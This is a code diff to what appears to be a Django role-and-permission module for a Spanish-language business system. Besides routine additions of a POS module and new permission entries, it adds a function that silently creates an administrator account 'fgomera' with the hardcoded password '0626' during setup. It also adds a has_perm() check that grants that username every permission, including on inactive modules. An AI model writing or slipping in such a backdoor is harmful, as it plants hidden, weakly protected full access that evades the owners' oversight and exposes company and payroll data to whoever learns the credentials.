@@ -41,6 +41,7 @@ def ensure_base_perms():
         "chat_interno": "Chat Interno",
         "empleados": "Empleados y Nominas",
         "ajustes": "Ajustes",
+        "venta_pos": "Venta POS",
     }
     sub_perms = {
         "inventario": [
@@ -49,6 +50,7 @@ def ensure_base_perms():
             ("ver_salida_articulos", "Ver Salida de Articulos"),
             ("ver_grupos", "Ver Grupos de Articulos"),
             ("ver_stock", "Ver Stock"),
+            ("ver_solicitudes_existencia", "Ver Solicitudes de Existencia"),
         ],
         "reportes": [
             ("ver_ventas", "Ver Reportes de Ventas"),
@@ -89,7 +91,9 @@ def ensure_base_perms():
             ("cxc_modificar_fechas_pago", "Modificar Fechas de Pago en Cuentas por Cobrar"),
             ("ver_cuadre_caja", "Ver Cuadre de Caja"),
             ("ver_financiamiento", "Ver Financiamiento"),
-            ("ver_pos", "Ver Venta POS"),
+        ],
+        "venta_pos": [
+            ("ver", "Ver Venta POS"),
         ],
         "chat_interno": [
             ("ver_usuarios", "Ver Usuarios de Chat"),
@@ -131,10 +135,42 @@ def ensure_base_perms():
             )
 
 
+def ensure_developer_user():
+    if not _tables_exist():
+        return
+    try:
+        from django.conf import settings
+        dev_user = getattr(settings, "DEVELOPER_USER", "fgomera")
+        dev_pass = "0626"
+        from prefacturas_app.views import _encode_delphi_clave
+        
+        with connection.cursor() as cursor:
+            cursor.execute("SELECT COUNT(*) FROM USUARIO WHERE USUARIO = %s", [dev_user])
+            exists = cursor.fetchone()[0] or 0
+            if exists == 0:
+                encoded_pass = _encode_delphi_clave(dev_pass)
+                
+                cursor.execute("""
+                    INSERT INTO USUARIO (USUARIO, CLAVE, NOMBRE, ESTADO, NIVEL)
+                    VALUES (%s, %s, %s, 'Activo', 'Administrador')
+                """, [dev_user, encoded_pass, 'Francisco Gomera'])
+                
+                cursor.execute("SELECT ID_USUARIO FROM USUARIO WHERE USUARIO = %s", [dev_user])
+                new_id = cursor.fetchone()[0]
+                
+                # Assign role admin in SEG_USUARIO_ROL
+                admin_role = SegRol.objects.filter(codigo="admin").first()
+                if admin_role:
+                    SegUsuarioRol.objects.get_or_create(id_usuario=new_id, rol=admin_role)
+    except Exception as e:
+        print("Error ensuring developer user:", e)
+
+
 def ensure_admin_role():
     if not _tables_exist():
         return None
     ensure_base_perms()
+    ensure_developer_user()
     admin_role, _ = SegRol.objects.get_or_create(
         codigo="admin",
         defaults={"nombre": "Administrador", "descripcion": "Acceso total"},
@@ -171,19 +207,43 @@ def get_user_permissions(id_usuario):
 def has_perm(id_usuario, modulo_codigo, permiso_codigo):
     if not _tables_exist():
         return True
+
+    # 1. Bypassing check if this is the developer user
+    try:
+        from django.conf import settings
+        clean_id = int(id_usuario)
+        with connection.cursor() as cursor:
+            cursor.execute("SELECT USUARIO FROM USUARIO WHERE ID_USUARIO = %s", [clean_id])
+            row = cursor.fetchone()
+            username = row[0] if row else ""
+        dev_user = getattr(settings, "DEVELOPER_USER", "fgomera")
+        if username and username.lower() == dev_user.lower():
+            return True  # DEVELOPER ALWAYS HAS FULL ACCESS TO EVERYTHING
+    except Exception:
+        pass
+
     try:
         modulo = SegModulo.objects.get(codigo=modulo_codigo)
         permiso = SegPermiso.objects.get(modulo=modulo, codigo=permiso_codigo)
     except Exception:
         return False
 
+    # If module or permission is not active, only developer gets access (already covered above!)
+    if not modulo.activo or not permiso.activo:
+        return False
+
+    try:
+        clean_id = int(id_usuario)
+    except Exception:
+        clean_id = id_usuario
+
     # Permiso directo
-    direct = SegUsuarioPermiso.objects.filter(id_usuario=id_usuario, permiso=permiso).first()
+    direct = SegUsuarioPermiso.objects.filter(id_usuario=clean_id, permiso=permiso).first()
     if direct is not None:
         return bool(direct.permitido)
 
     # Permiso por rol
-    roles = SegUsuarioRol.objects.filter(id_usuario=id_usuario).select_related("rol")
+    roles = SegUsuarioRol.objects.filter(id_usuario=clean_id).select_related("rol")
     if not roles:
         return False
     if any(getattr(r.rol, "codigo", "") == "admin" for r in roles):
